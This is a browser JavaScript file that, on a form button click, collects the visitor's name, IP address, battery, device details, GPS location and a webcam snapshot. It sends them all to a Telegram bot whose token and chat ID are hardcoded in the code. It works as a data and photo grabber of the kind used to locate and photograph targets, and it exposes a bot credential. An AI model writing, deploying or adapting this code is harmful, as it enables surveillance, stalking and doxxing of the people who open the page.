document.getElementById('sendInfoButton').addEventListener('click', async function () {
    const name = document.getElementById('userName').value;

    if (!name) {
        alert('Please fill in your name');
        return;
    }

    let batteryLevel = 'N/A';
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = (battery.level * 100).toFixed(0) + '%';
    }

    let ipAddress = 'N/A';
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ipAddress = data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language || navigator.userLanguage;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const onlineStatus = navigator.onLine ? 'Online' : 'Offline';

    let locationInfo = 'N/A';
    let staticMapUrl = '';
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                locationInfo = `Latitude: ${latitude}, Longitude: ${longitude}`;
                staticMapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=600x300&markers=color:red%7Clabel:C%7C${latitude},${longitude}&key=YOUR_API_KEY`;
                captureAndSendPhoto(staticMapUrl);
            },
            (error) => {
                console.error('Error getting location:', error);
                captureAndSendPhoto(staticMapUrl);
            }
        );
    } else {
        captureAndSendPhoto(staticMapUrl);
    }

    async function captureAndSendPhoto(mapUrl) {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('snapshot');
        const botToken = '6524346899:AAFrXk72Y4VAfMXWsCoLfUPpRy-oSx4fefo';
        const chatId = '5747112293';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.style.display = 'block';
            video.srcObject = stream;

            await new Promise((resolve) => (video.onloadedmetadata = resolve));

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            stream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';

            const imageData = canvas.toDataURL('image/png');

            const messageText = `
                User Info:
                Name: ${name}
                Battery Level: ${batteryLevel}
                IP Address: ${ipAddress}
                User Agent: ${userAgent}
                Platform: ${platform}
                Language: ${language}
                Screen Size: ${screenWidth} x ${screenHeight}
                Status: ${onlineStatus}
                Location: ${locationInfo}
                Map: ${mapUrl}
            `;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: messageText
                })
            });

            const blob = await fetch(imageData).then(res => res.blob());
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'snapshot.png');
            
            const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
            await fetch(photoUrl, {
                method: 'POST',
                body: formData
            });

            alert('Information and photo sent successfully!');
        } catch (error) {
            console.error('Error accessing webcam or sending data:', error);
            alert('Failed to access webcam or send information.');
        }
    }
});
